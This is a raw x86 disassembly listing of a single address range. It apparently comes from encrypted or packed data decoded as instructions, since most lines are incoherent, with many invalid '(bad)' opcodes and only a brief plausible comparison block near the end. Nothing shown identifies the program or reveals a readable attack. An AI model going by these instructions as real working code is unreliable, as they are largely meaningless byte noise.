  40e3cd:	dec    ebx
  40e3ce:	mov    eax,ds:0x67247453
  40e3d3:	sbb    DWORD PTR [ebp+eiz*8+0xa],0x264f68b5
  40e3db:	mov    bl,0x14
  40e3dd:	data16 mov al,ds:0xf3a65147
  40e3e3:	les    ebp,FWORD PTR [eax+0x27]
  40e3e6:	pop    esi
  40e3e7:	jno    0x40e40a
  40e3e9:	adc    BYTE PTR [eax],dh
  40e3eb:	adc    DWORD PTR [esp+ecx*2+0xc],eax
  40e3ef:	in     al,dx
  40e3f0:	cld    
  40e3f1:	ret    
  40e3f2:	fidiv  DWORD PTR [ecx]
  40e3f4:	das    
  40e3f5:	xor    ecx,ebp
  40e3f7:	xchg   esp,eax
  40e3f8:	and    al,0x70
  40e3fa:	lahf   
  40e3fb:	inc    esp
  40e3fc:	sbb    al,0x50
  40e3fe:	ds call 0x374f:0x462d7dda
  40e406:	stos   BYTE PTR es:[edi],al
  40e407:	fist   WORD PTR [ebp-0x97338f]
  40e40d:	jmp    DWORD PTR [ecx-0x45]
  40e410:	cmpxchg ah,dl
  40e413:	mov    ch,0x5d
  40e415:	pop    edx
  40e416:	cmp    eax,0xd131f182
  40e41b:	ret    
  40e41c:	push   edx
  40e41d:	xchg   BYTE PTR [eax],dh
  40e41f:	inc    ebp
  40e420:	arpl   si,cx
  40e422:	push   edx
  40e423:	pop    ebx
  40e424:	les    esi,FWORD PTR [edi+0x24657800]
  40e42a:	push   edx
  40e42b:	dec    edi
  40e42c:	pop    ebp
  40e42d:	mov    BYTE PTR [ebx-0x1b3cde9f],cl
  40e433:	dec    edx
  40e434:	and    ebx,DWORD PTR [ebx+eax*8-0x5c]
  40e438:	gs stos DWORD PTR es:[edi],eax
  40e43a:	jb     0x40e3d1
  40e43c:	and    BYTE PTR [esi-0x4db2d650],bl
  40e442:	(bad)  
  40e444:	add    DWORD PTR [ecx+0xa05f85b],eax
  40e44a:	mov    al,ds:0xeaae4471
  40e44f:	ja     0x40e425
  40e451:	pop    ss
  40e452:	push   0xa82650ca
  40e457:	nop
  40e458:	pop    edi
  40e459:	enter  0xea6,0xd8
  40e45d:	xlat   BYTE PTR ds:[ebx]
  40e45e:	pop    es
  40e45f:	add    DWORD PTR [ebx],edi
  40e461:	pop    ebx
  40e462:	outs   dx,DWORD PTR ds:[esi]
  40e463:	dec    eax
  40e464:	popa   
  40e465:	lods   al,BYTE PTR ds:[esi]
  40e466:	aad    0xb9
  40e468:	scas   al,BYTE PTR es:[edi]
  40e469:	call   ebx
  40e46b:	pop    ss
  40e46c:	mov    ah,0x6d
  40e46e:	dec    ebp
  40e46f:	aaa    
  40e470:	xchg   esi,eax
  40e471:	mov    dl,0xcc
  40e473:	mov    ch,0xb9
  40e475:	ficomp DWORD PTR [edi]
  40e477:	es loop 0x40e424
  40e47a:	pop    ds
  40e47b:	int3   
  40e47c:	cmp    DWORD PTR [ebx+0x56ce5006],0xffffffd3
  40e483:	cmp    al,BYTE PTR [edi]
  40e485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e486:	inc    edx
  40e487:	jmp    0x6e8f:0x1a8ccec3
  40e48e:	dec    ebp
  40e48f:	stos   DWORD PTR es:[edi],eax
  40e490:	add    dh,BYTE PTR [eax-0x1f]
  40e493:	enter  0x960c,0x7b
  40e497:	jb     0x40e428
  40e499:	fisubr DWORD PTR [edx-0x2f]
  40e49c:	mov    edx,0xdc248e19
  40e4a1:	aad    0x85
  40e4a3:	aam    0x46
  40e4a5:	fucomp st(1)
  40e4a7:	xor    al,0x3c
  40e4a9:	and    al,0x3a
  40e4ab:	mov    al,ds:0x2b9a3e9e
  40e4b0:	mov    esp,0xd15a2ae6
  40e4b5:	sub    BYTE PTR [edx+0x59a6dc78],0x77
  40e4bc:	xchg   esi,eax
  40e4bd:	dec    edx
  40e4be:	xor    eax,0x276b2eb7
  40e4c3:	hlt    
  40e4c4:	repz cwde 
  40e4c6:	dec    esi
  40e4c7:	mov    bh,0xe7
  40e4c9:	pop    eax
  40e4ca:	call   0x21b0:0x45f90404
  40e4d1:	aaa    
  40e4d2:	xor    esi,ebp
  40e4d4:	popa   
  40e4d5:	loopne 0x40e535
  40e4d7:	xchg   ebx,eax
  40e4d8:	jns    0x40e4db
  40e4da:	push   edi
  40e4db:	xlat   BYTE PTR ds:[ebx]
  40e4dc:	in     al,0x2f
  40e4de:	popf   
  40e4df:	jb     0x40e52d
  40e4e1:	xor    DWORD PTR [edx],edx
  40e4e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4e4:	shr    cl,0x42
  40e4e7:	xor    dh,BYTE PTR [edi]
  40e4e9:	push   edi
  40e4ea:	fcmovu st,st(3)
  40e4ec:	or     eax,0x34c5dcff
  40e4f1:	cli    
  40e4f2:	push   0xc03b291e
  40e4f7:	xor    al,0x91
  40e4f9:	in     al,dx
  40e4fa:	ss push esp
  40e4fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4fd:	out    0xb2,al
  40e4ff:	js     0x40e567
  40e501:	out    0x8e,eax
  40e503:	(bad)  
  40e505:	rol    DWORD PTR [edx-0x49cc1b26],cl
  40e50b:	sti    
  40e50c:	fcomp  QWORD PTR ds:0xcc9b48b
  40e512:	lods   eax,DWORD PTR ds:[esi]
  40e513:	fisub  DWORD PTR [edi+0x78073846]
  40e519:	sub    DWORD PTR [ebp+0x1ce56080],esi
  40e51f:	fnstenv [esi-0x3b2c2ac9]
  40e525:	bound  edi,QWORD PTR [eax]
  40e527:	mov    al,BYTE PTR [edx]
  40e529:	pop    ebp
  40e52a:	push   es
  40e52b:	stos   DWORD PTR es:[edi],eax
  40e52c:	ja     0x40e599
  40e52e:	adc    esi,ebp
  40e530:	mov    ?,ecx
  40e532:	les    edi,FWORD PTR [eax-0x6f]
  40e535:	shl    BYTE PTR [edx-0x5b],cl
  40e538:	sbb    BYTE PTR [edx-0x9ee5dd7],0xaa
  40e53f:	out    dx,al
  40e540:	enter  0xc2fe,0x47
  40e544:	adc    ebp,esi
  40e546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e547:	call   0xa265:0x3116d5ad
  40e54e:	cwde   
  40e54f:	scas   eax,DWORD PTR es:[edi]
  40e550:	enter  0x9848,0x4e
  40e554:	sbb    DWORD PTR [edx],esp
  40e556:	push   0xffffff94
  40e558:	out    0x68,al
  40e55a:	jmp    0x40e4f6
  40e55c:	adc    al,BYTE PTR [ebx]
  40e55e:	imul   ebp,DWORD PTR [edx-0x50],0x5e3fea03
  40e565:	ret    
  40e566:	imul   esp,DWORD PTR [edx+edi*4+0x20],0x63
  40e56b:	inc    esp
  40e56c:	mov    dl,0x51
  40e56e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e56f:	pusha  
  40e570:	mov    ds:0x93311f38,eax
  40e575:	pop    edx
  40e576:	cwde   
  40e577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e578:	fadd   QWORD PTR [edx+ebx*4+0x29]
  40e57c:	push   esi
  40e57d:	nop
  40e57e:	js     0x40e5d0
  40e580:	dec    edx
  40e581:	xchg   DWORD PTR [ebp-0x6c],ebx
  40e584:	lods   al,BYTE PTR ds:[esi]
  40e585:	and    eax,0x6c3b3ad3
  40e58a:	inc    ebx
  40e58b:	or     eax,0x750e0c72
  40e590:	or     eax,0xd0cec09c
  40e595:	jns    0x40e578
  40e597:	add    al,0xa1
  40e599:	cmp    BYTE PTR [ebx+0x1b],al
  40e59c:	adc    al,0x81
  40e59e:	xlat   BYTE PTR ds:[ebx]
  40e59f:	lahf   
  40e5a0:	(bad)  
  40e5a1:	inc    eax
  40e5a2:	add    al,0x46
  40e5a4:	xlat   BYTE PTR ds:[ebx]
  40e5a5:	loope  0x40e5ac
  40e5a7:	iret   
  40e5a8:	fwait
  40e5a9:	dec    ebx
  40e5aa:	sbb    dl,BYTE PTR [ebp-0x6509877]
  40e5b0:	fwait
  40e5b1:	leave  
  40e5b2:	loop   0x40e548
  40e5b4:	retf   
  40e5b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5b6:	mov    BYTE PTR [eax-0x2fbd1a55],al
  40e5bc:	or     BYTE PTR [ebp+ebx*8+0x71],al
  40e5c0:	cmp    eax,DWORD PTR [esp+edi*2-0x61]
  40e5c4:	mov    eax,0xa7f47a80
  40e5c9:	mov    esp,0x58778f7c
  40e5ce:	mov    esi,0x6c835a6
  40e5d3:	pop    ebx
  40e5d4:	adc    eax,DWORD PTR [ebp-0x3d5d5b62]
  40e5da:	push   edx
  40e5db:	popa   
  40e5dc:	mov    ds:0xc932a35d,eax
  40e5e1:	mov    ah,0xba
  40e5e3:	out    dx,al
  40e5e4:	sbb    eax,0xfcada492
  40e5e9:	dec    edx
  40e5ea:	inc    edi
  40e5eb:	sub    ebx,DWORD PTR [edi]
  40e5ed:	arpl   WORD PTR [edi],bx
  40e5ef:	mov    bl,0x93
  40e5f1:	retf   
  40e5f2:	sbb    dl,dl
  40e5f4:	or     bh,BYTE PTR [ebx]
  40e5f6:	sub    eax,0xaef7b54c
  40e5fb:	ins    DWORD PTR es:[edi],dx
  40e5fc:	and    edi,ebx
  40e5fe:	imul   ebx,DWORD PTR [ebx-0x5e],0xffffffa2
  40e602:	pop    ebp
  40e603:	jmp    0xfa17:0x2a61f7aa
  40e60a:	test   BYTE PTR [ebp-0x12555c2],ah
  40e610:	stos   BYTE PTR es:[edi],al
  40e611:	mov    ?,WORD PTR [eax-0x3ad806b4]
  40e617:	mov    eax,ds:0xf5211763
  40e61c:	aas    
  40e61d:	mov    ebx,ebp
  40e61f:	out    0xce,al
  40e621:	add    dl,BYTE PTR [esi-0x32]
  40e624:	jbe    0x40e697
  40e626:	fsub   QWORD PTR [ebx+edi*2-0x6bea9791]
  40e62d:	cmp    edx,DWORD PTR ds:0x87e515d6
  40e633:	mov    fs,WORD PTR [esi+edx*8]
  40e636:	or     eax,0xdbe13b4a
  40e63b:	(bad)  
  40e63c:	mov    ah,0xcc
  40e63e:	(bad)  
  40e640:	and    BYTE PTR gs:[ecx],dh
  40e643:	sub    ebp,DWORD PTR [ecx-0x13bcbf3e]
  40e649:	pop    ss
  40e64a:	pop    esp
  40e64b:	add    ecx,DWORD PTR [ecx+eax*8]
  40e64e:	jo     0x40e6b6
  40e650:	push   esi
  40e651:	jmp    eax
  40e653:	adc    DWORD PTR [ebp-0x721eade0],esp
  40e659:	pop    es
  40e65a:	in     al,0x82
  40e65c:	cmp    DWORD PTR [edx+0x35],0xffffff94
  40e660:	xchg   edx,eax
  40e661:	mov    ds,WORD PTR [ecx-0x2]
  40e664:	cmp    bl,BYTE PTR [edx]
  40e666:	mov    ds:0x16766bcb,al
  40e66b:	add    ah,BYTE PTR [ebx-0x51040dec]
  40e671:	out    0x3d,al
  40e673:	cdq    
  40e674:	mov    eax,0x33390f6d
  40e679:	sbb    DWORD PTR [ebx-0x4de622c8],ecx
  40e67f:	fist   WORD PTR [esi+0x2670f985]
  40e685:	dec    ecx
  40e686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e687:	outs   dx,BYTE PTR ds:[esi]
  40e688:	and    bh,BYTE PTR [edi]
  40e68a:	mov    bl,0xd1
  40e68c:	(bad)  
  40e68d:	pop    eax
  40e68e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e68f:	push   ds
  40e690:	sbb    DWORD PTR [edi+0x47],ecx
  40e693:	jle    0x40e67a
  40e695:	retf   0xb878
  40e698:	xchg   edx,eax
  40e699:	(bad)  
  40e69a:	nop
  40e69b:	pop    esp
  40e69c:	jmp    0x9abfd747
  40e6a1:	div    DWORD PTR [esi+0x303f5c92]
  40e6a7:	bound  edx,QWORD PTR [eax]
  40e6a9:	mov    ch,0x79
  40e6ab:	out    0xc,al
  40e6ad:	test   al,0xd8
  40e6af:	and    al,0xac
  40e6b1:	loop   0x40e637
  40e6b3:	fdivp  st(4),st
  40e6b5:	lahf   
  40e6b6:	sbb    BYTE PTR [ebx],0x60
  40e6b9:	mov    ds:0xa0fe0b1a,al
  40e6be:	push   ss
  40e6bf:	ss pop ecx
  40e6c1:	push   ecx
  40e6c2:	ins    DWORD PTR es:[edi],dx
  40e6c3:	stc    
  40e6c4:	imul   esi,DWORD PTR [eax+0x1e],0x40
  40e6c8:	inc    eax
  40e6c9:	(bad)  
  40e6ca:	int3   
  40e6cb:	jmp    0x1a3000fb
  40e6d0:	inc    eax
  40e6d1:	int3   
  40e6d2:	add    dh,ah
  40e6d4:	xor    BYTE PTR [ecx+0x3c1e901],cl
  40e6da:	add    BYTE PTR [eax],al
  40e6dc:	or     ebp,DWORD PTR [edx+0x67]
  40e6df:	aam    0x61
  40e6e1:	(bad)  [ebx+0x4d03ef7d]
  40e6e7:	jns    0x40e6c1
  40e6e9:	cs dec ebp
  40e6eb:	(bad)  
  40e6ec:	ins    BYTE PTR es:[edi],dx
  40e6ed:	mov    eax,ds:0x79a77c7c
  40e6f2:	jl     0x40e770
  40e6f4:	mov    ebp,0x918110c7
  40e6f9:	and    ebp,DWORD PTR [ecx]
  40e6fb:	pop    ss
  40e6fc:	ja     0x40e73e
  40e6fe:	sbb    al,0x23
  40e700:	jne    0x40e696
  40e702:	rcr    BYTE PTR [ebp-0x7],1
  40e705:	cmp    edi,ebp
  40e707:	pop    eax
  40e708:	loope  0x40e737
  40e70a:	retf   0x6f7c
  40e70d:	or     eax,0x39b0a474
  40e712:	adc    esp,DWORD PTR [ebp-0x57e6b63d]
  40e718:	aad    0x99
  40e71a:	call   0x814895de
  40e71f:	push   edi
  40e720:	sbb    eax,0xbf63457b
  40e725:	sbb    ebx,DWORD PTR [edx-0x2563ccfb]
  40e72b:	mov    ebx,0xb7d972a9
  40e730:	call   0xb972:0xee95a7b6
  40e737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e738:	mov    bh,0xb9
  40e73a:	repz out 0xfc,eax
  40e73d:	jae    0x40e736
  40e73f:	enter  0xd20a,0x1
  40e743:	mov    bl,0x5c
  40e745:	jo     0x40e732
  40e747:	nop
  40e748:	or     ebp,ebp
  40e74a:	mov    dh,0xf8
  40e74c:	jmp    0xdc92:0x813e6f4e
  40e753:	arpl   WORD PTR [eax+0x124f35af],bp
  40e759:	pop    esi
  40e75a:	or     BYTE PTR [ebx+0x571faff8],bl
  40e760:	aam    0x3b
  40e762:	inc    esi
  40e763:	enter  0x4ada,0x6
  40e767:	jo     0x40e716
  40e769:	add    bh,bl
  40e76b:	pushf  
  40e76c:	mov    ah,0x1b
  40e76e:	rcl    BYTE PTR [ecx+0x6fb17f35],cl
  40e774:	and    BYTE PTR [edi+0xc],0x7d
  40e778:	idiv   DWORD PTR [ecx+0x7c41c979]
  40e77e:	sbb    al,0x3b
  40e780:	mov    cl,BYTE PTR [eax+0x47]
  40e783:	and    dl,BYTE PTR [ebp-0x59]
  40e786:	adc    edx,DWORD PTR ds:[esi-0x4c]
  40e78a:	fwait
  40e78b:	inc    edi
  40e78c:	mov    WORD PTR [edi+esi*1-0x1c36dcc8],ds
  40e793:	sahf   
  40e794:	mov    WORD PTR [esi-0x2e1cad68],?
  40e79a:	pop    ebp
  40e79b:	sbb    eax,0x206e919
  40e7a0:	les    eax,FWORD PTR ds:0x85f695ba
  40e7a6:	cld    
  40e7a7:	jge    0x40e780
  40e7a9:	iret   
  40e7aa:	push   ebp
  40e7ab:	loopne 0x40e7e5
  40e7ad:	xchg   esi,eax
  40e7ae:	lods   al,BYTE PTR ds:[esi]
  40e7af:	cdq    
  40e7b0:	lods   al,BYTE PTR ds:[esi]
  40e7b1:	dec    ecx
  40e7b2:	xchg   DWORD PTR gs:0x868cc195,esi
  40e7b9:	jne    0x40e827
  40e7bb:	pop    es
  40e7bc:	inc    edi
  40e7bd:	mov    dh,0x5d
  40e7bf:	ds pop esp
  40e7c1:	xchg   bx,ax
  40e7c3:	jo     0x40e752
  40e7c5:	sbb    al,BYTE PTR [edx-0x5d]
  40e7c8:	and    ch,BYTE PTR ss:[ecx+0xe]
  40e7cc:	mov    dh,0x3
  40e7ce:	push   eax
  40e7cf:	adc    DWORD PTR [ebx-0x4b],0x78014443
  40e7d6:	stos   DWORD PTR es:[edi],eax
  40e7d7:	sbb    BYTE PTR [ebp+0x7eca5f30],cl
  40e7dd:	jb     0x40e7bb
  40e7df:	mov    cs,WORD PTR [eax-0x6c74dd27]
  40e7e5:	and    al,0xa0
  40e7e8:	shl    BYTE PTR [esi+0x1],0x72
  40e7ec:	iret   
  40e7ed:	jmp    0x7e0b0fc
  40e7f2:	push   ss
  40e7f3:	mov    ecx,0xe0d87093
  40e7f8:	xor    DWORD PTR [ebx],edx
  40e7fa:	xchg   ebx,eax
  40e7fb:	sbb    DWORD PTR [eax+0x36],edi
  40e7fe:	pop    edi
  40e7ff:	mov    bh,0xbc
  40e801:	lods   al,BYTE PTR ds:[esi]
  40e802:	popa   
  40e803:	(bad)  
  40e804:	imul   esi,edx,0x4a
  40e807:	mov    bh,0x9c
  40e809:	jp     0x40e820
  40e80b:	ins    DWORD PTR es:[edi],dx
  40e80c:	mov    BYTE PTR [edi-0x3d5b598],ah
  40e812:	dec    ebx
  40e813:	cdq    
  40e814:	leave  
  40e815:	pop    ss
  40e816:	dec    esp
  40e817:	dec    ecx
  40e818:	mov    edx,0x456a62df
  40e81d:	or     ecx,DWORD PTR [eax+esi*4-0x2e]
  40e821:	in     al,0x8f
  40e823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e824:	cmp    esi,esi
  40e826:	cs scas al,BYTE PTR es:[edi]
  40e828:	jb     0x40e817
  40e82a:	(bad)  
  40e82b:	mov    DWORD PTR [edx],ebx
  40e82d:	(bad)  
  40e82e:	int3   
  40e82f:	adc    DWORD PTR fs:[esi],0xc51158dd
  40e836:	xor    ebx,DWORD PTR [esi-0x7e]
  40e839:	fcmovnu st,st(5)
  40e83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e83c:	(bad)  
  40e83d:	mov    edx,0x3ccece82
  40e842:	stos   BYTE PTR es:[edi],al
  40e843:	jge    0x40e85e
  40e845:	and    eax,0x9da52d79
  40e84a:	pusha  
  40e84b:	mov    bh,0xc7
  40e84d:	mov    BYTE PTR [eax-0x1d],ch
  40e850:	daa    
  40e851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e852:	dec    esi
  40e853:	icebp  
  40e854:	js     0x40e86c
  40e856:	scas   eax,DWORD PTR es:[edi]
  40e857:	fstp   TBYTE PTR [ebp-0x4b]
  40e85a:	out    0xcf,al
  40e85c:	test   al,cl
  40e85e:	mov    eax,0xb6b68fe
  40e863:	jae    0x40e8a7
  40e865:	call   0x1a71fbd9
  40e86a:	pop    ebp
  40e86b:	clc    
  40e86c:	and    BYTE PTR [ebx],bh
  40e86e:	cwde   
  40e86f:	int    0xf7
  40e871:	and    al,0xab
  40e873:	ins    BYTE PTR es:[edi],dx
  40e874:	adc    eax,esi
  40e876:	aam    0x6e
  40e878:	xor    BYTE PTR [esi+0x6dfdcc00],cl
  40e87e:	pusha  
  40e87f:	lods   al,BYTE PTR ds:[esi]
  40e880:	mov    ebx,0x97bb325d
  40e885:	pop    ebp
  40e886:	and    DWORD PTR [edi+0x8b5f132],ecx
  40e88c:	and    DWORD PTR [eax+0x5a38ff0b],ebx
  40e892:	scas   eax,DWORD PTR es:[edi]
  40e893:	ror    BYTE PTR [esp+edx*1],cl
  40e896:	sbb    cl,BYTE PTR [eax-0x2ff716a7]
  40e89c:	mov    ebx,0x5af66271
  40e8a1:	dec    esi
  40e8a2:	ins    DWORD PTR es:[edi],dx
  40e8a3:	mov    esp,0x77c5a90b
  40e8a8:	add    DWORD PTR [ebx],eax
  40e8aa:	pusha  
  40e8ab:	gs stos BYTE PTR es:[edi],al
  40e8ad:	mov    edi,0x3ad7274a
  40e8b2:	jo     0x40e870
  40e8b4:	jp     0x40e83f
  40e8b6:	sub    al,BYTE PTR [eax+0x13]
  40e8b9:	js     0x40e895
  40e8bb:	(bad)  
  40e8bc:	xchg   edi,eax
  40e8bd:	and    BYTE PTR [edx],al
  40e8bf:	stc    
  40e8c0:	loop   0x40e859
  40e8c2:	scas   eax,DWORD PTR es:[edi]
  40e8c3:	push   edx
  40e8c4:	outs   dx,DWORD PTR ds:[esi]
  40e8c5:	mov    ds:0xae091383,al
  40e8ca:	aam    0x9d
  40e8cc:	out    dx,eax
  40e8cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8ce:	xor    ah,BYTE PTR [edi+eax*1]
  40e8d1:	sub    al,0x3f
  40e8d3:	gs pop eax
  40e8d5:	mov    ecx,0xefacc0b8
  40e8da:	xchg   ebx,eax
  40e8db:	call   0x8700648a
  40e8e0:	xchg   esi,eax
  40e8e1:	push   edi
  40e8e2:	mov    eax,0x3d3f30c3
  40e8e7:	inc    edx
  40e8e8:	push   ecx
  40e8e9:	jno    0x40e92f
  40e8eb:	mov    dl,0xc1
  40e8ed:	jno    0x40e8b8
  40e8ef:	jbe    0x40e8ab
  40e8f1:	sub    dl,BYTE PTR [edx+ebp*4-0x28023915]
  40e8f8:	nop
  40e8f9:	jns    0x40e8f9
  40e8fb:	mov    bh,0x50
  40e8fd:	sub    BYTE PTR ds:0xd1a1a244,al
  40e903:	cmp    eax,0x971fade8
  40e908:	add    al,0x42
  40e90a:	nop
  40e90b:	ins    DWORD PTR es:[edi],dx
  40e90c:	adc    edx,DWORD PTR [esi]
  40e90e:	imul   eax
  40e910:	inc    edi
  40e911:	pop    edi
  40e912:	jb     0x40e900
  40e914:	pusha  
  40e915:	fidivr DWORD PTR [ecx]
  40e917:	xchg   ecx,eax
  40e918:	or     al,0x68
  40e91a:	sti    
  40e91b:	xchg   ebx,eax
  40e91c:	jge    0x40e908
  40e91e:	fwait
  40e91f:	mov    dh,0x1
  40e921:	push   ds
  40e922:	cdq    
  40e923:	xchg   dl,dh
  40e925:	in     al,dx
  40e926:	push   cs
  40e927:	or     dl,BYTE PTR [ebx-0x6ea19eaa]
  40e92d:	(bad)  
  40e92e:	iret   
  40e92f:	mov    edi,0xbfe4d28a
  40e934:	aam    0x3b
  40e936:	popa   
  40e937:	shl    BYTE PTR [eax-0x48],0x7b
  40e93b:	mov    ebp,0xea6fd54
  40e940:	cmp    DWORD PTR [ebx-0x76],edx
  40e943:	pop    ds
  40e944:	mov    esi,0xbd34ee71
  40e949:	add    ch,BYTE PTR [eax]
  40e94b:	pop    edi
  40e94c:	clc    
  40e94d:	fwait
  40e94e:	mov    cl,0x8d
  40e950:	pusha  
  40e951:	bound  eax,QWORD PTR [ebp-0xdd4a4a8]
  40e957:	in     al,0xf8
  40e959:	mov    BYTE PTR [ebx+0x63934067],dl
  40e95f:	xor    ebx,DWORD PTR [ecx+0x5e]
  40e962:	imul   ebx,DWORD PTR [esi+0x64],0xffffffcf
  40e966:	cmp    DWORD PTR [ebx-0x59d26c2d],edx
  40e96c:	cld    
  40e96d:	scas   al,BYTE PTR es:[edi]
  40e96e:	cmp    esi,DWORD PTR [esi]
  40e970:	add    edx,edi
  40e972:	aaa    
  40e973:	jge    0x40e9d1
  40e975:	rcr    BYTE PTR [ebp-0x6eb10bb1],1
  40e97b:	mov    al,0x62
  40e97d:	pop    ss
  40e97e:	icebp  
  40e97f:	loope  0x40e948
  40e981:	pop    ebx
  40e982:	js     0x40e937
  40e984:	jae    0x40e92e
  40e986:	push   edi
  40e987:	or     edi,DWORD PTR [eax]
  40e989:	dec    DWORD PTR [edi-0x2369acd3]
  40e98f:	je     0x40e93e
  40e991:	pushf  
  40e992:	fsub   QWORD PTR [edi]
  40e994:	loopne 0x40e934
  40e996:	jo     0x40e921
  40e998:	inc    edx
  40e999:	add    eax,0x10285737
  40e99e:	dec    edi
  40e99f:	jae    0x40e9d5
  40e9a1:	fild   WORD PTR [edx+0x271ef32d]
  40e9a7:	xlat   BYTE PTR ds:[ebx]
  40e9a8:	mov    cl,0xec
  40e9aa:	test   BYTE PTR [eax-0x54],al
  40e9ad:	xlat   BYTE PTR ds:[ebx]
  40e9ae:	fs jecxz 0x40e966
  40e9b1:	jbe    0x40ea1d
  40e9b3:	and    al,0xda
  40e9b5:	cmp    bh,BYTE PTR [eax]
  40e9b7:	jmp    0x40e9a9
  40e9b9:	and    DWORD PTR [edi+0x51479a68],eax
  40e9bf:	in     eax,dx
  40e9c0:	iret   
  40e9c1:	scas   eax,DWORD PTR es:[edi]
  40e9c2:	mov    eax,0xcb06585b
  40e9c7:	sbb    dh,BYTE PTR [bx+si+0x7775]
  40e9cc:	adc    esi,DWORD PTR ds:0xf7b258b7
  40e9d2:	mov    dh,0xc2
  40e9d4:	inc    ecx
  40e9d5:	arpl   WORD PTR [esp+ebx*1-0xcfa1d43],si
  40e9dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9dd:	inc    ebx
  40e9de:	mov    al,ds:0xa569186f
  40e9e3:	mov    bh,0xad
  40e9e5:	bound  esp,QWORD PTR [ecx+esi*4+0x1d271c51]
  40e9ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9ed:	xchg   esi,eax
  40e9ee:	fwait
  40e9ef:	jl     0x40ea4d
  40e9f1:	sti    
  40e9f2:	aaa    
  40e9f3:	mul    DWORD PTR [esi+ebp*4]
  40e9f6:	pop    eax
  40e9f7:	sub    al,0x83
  40e9f9:	jl     0x40e9fc
  40e9fb:	mov    ah,0x8d
  40e9fd:	and    ebp,DWORD PTR [edi]
  40e9ff:	fstp   DWORD PTR [esi-0x3f]
  40ea02:	scas   al,BYTE PTR es:[edi]
  40ea03:	scas   eax,DWORD PTR es:[edi]
  40ea04:	test   DWORD PTR [eax-0x42],edx
  40ea07:	aaa    
  40ea08:	lds    esp,FWORD PTR [ecx-0x7f]
  40ea0b:	pop    esi
  40ea0c:	mov    dh,0x85
  40ea0e:	mov    ebp,0xe4c9aa00
  40ea13:	into   
  40ea14:	push   ds
  40ea15:	out    dx,eax
  40ea16:	ret    0xbb48
  40ea19:	mov    DWORD PTR [eax-0x40],edx
  40ea1c:	lahf   
  40ea1d:	xchg   esi,eax
  40ea1e:	pop    ds
  40ea1f:	jne    0x40ea1d
  40ea21:	pop    edx
  40ea22:	xor    ebp,edi
  40ea24:	scas   al,BYTE PTR es:[edi]
  40ea25:	add    DWORD PTR [edi],0x84da5875
  40ea2b:	push   edi
  40ea2c:	push   edi
  40ea2d:	loopne 0x40ea9d
  40ea2f:	test   al,0x10
  40ea31:	pop    edi
  40ea32:	xchg   ebp,eax
  40ea33:	fdivr  DWORD PTR [ebp-0x71]
  40ea36:	sbb    dl,BYTE PTR [edx+0x2]
  40ea39:	repz push edx
  40ea3b:	mov    ch,0xce
  40ea3d:	rcr    edx,1
  40ea3f:	dec    edx
  40ea41:	mov    edi,0xf8f2aab6
  40ea46:	and    eax,0xaccee61f
  40ea4b:	adc    al,BYTE PTR [esi+0x1d68a401]
  40ea51:	xchg   esi,eax
  40ea52:	sub    ah,BYTE PTR [eax+0x12]
  40ea55:	adc    esp,DWORD PTR [ebp+0x41]
  40ea58:	fdiv   DWORD PTR [edx+edi*2-0x567b67c7]
  40ea5f:	mov    ah,0x98
  40ea61:	pop    ebx
  40ea62:	jbe    0x40ea93
  40ea64:	(bad)  [eax+0x5ff130a9]
  40ea6a:	ret    0x880e
  40ea6d:	pop    es
  40ea6e:	adc    al,0xf
  40ea70:	loop   0x40ea2a
  40ea72:	xchg   esp,eax
  40ea73:	adc    ebp,edx
  40ea75:	pop    esp
  40ea76:	ss dec esp
  40ea78:	gs jmp 0x7981:0x2085c5c
  40ea80:	mov    dl,0x7e
  40ea82:	mov    al,0xf8
  40ea84:	push   edi
  40ea85:	popa   
  40ea86:	(bad)  [ecx]
  40ea88:	scas   al,BYTE PTR es:[edi]
  40ea89:	bound  esi,QWORD PTR [edx+ebp*2]
  40ea8c:	push   ds
  40ea8d:	sbb    BYTE PTR [ecx+edi*8-0x491f6eb9],0xd1
  40ea95:	jnp    0x40ea4c
  40ea97:	xor    DWORD PTR [ecx+eax*2-0x4d],ebx
  40ea9b:	push   ss
  40ea9c:	mov    cl,0x8b
  40ea9e:	inc    ebp
  40ea9f:	clc    
  40eaa0:	jmp    0x40f269
  40eaa5:	mov    eax,DWORD PTR [ebp-0x4]
  40eaa8:	mov    ecx,DWORD PTR [ebp+0x10]
  40eaab:	xor    eax,edi
  40eaad:	add    eax,esi
  40eaaf:	cmp    eax,ecx
  40eab1:	jne    0x40f266
  40eab7:	mov    eax,DWORD PTR [ebp-0x4]
  40eaba:	xor    eax,edi
  40eabc:	add    eax,esi
  40eabe:	jmp    0x40ee84
  40eac3:	icebp  
  40eac4:	jmp    0x40ea54
  40eac6:	imul   edx,DWORD PTR [edx+0x1973f175],0xb083fe94
  40ead0:	arpl   bx,ax
  40ead2:	inc    eax
  40ead3:	xchg   edi,eax
  40ead4:	lods   eax,DWORD PTR ds:[esi]
  40ead5:	jl     0x40eb53
  40ead7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ead8:	jns    0x40eb56
  40eada:	jl     0x40ea79
  40eadc:	mov    DWORD PTR [esi+0x78],ecx
  40eadf:	test   dh,0x68
  40eae2:	mov    eax,0x6b46d707
  40eae7:	leave  
  40eae8:	dec    ecx
  40eae9:	jecxz  0x40eab0
  40eaeb:	call   0xf04d319d
  40eaf0:	outs   dx,DWORD PTR ds:[esi]
  40eaf1:	mov    ah,dl
  40eaf3:	sar    DWORD PTR [ecx+eiz*2+0x54525c0f],1
  40eafa:	icebp  
  40eafb:	jp     0x40ea87
  40eafd:	fimul  DWORD PTR [edx]
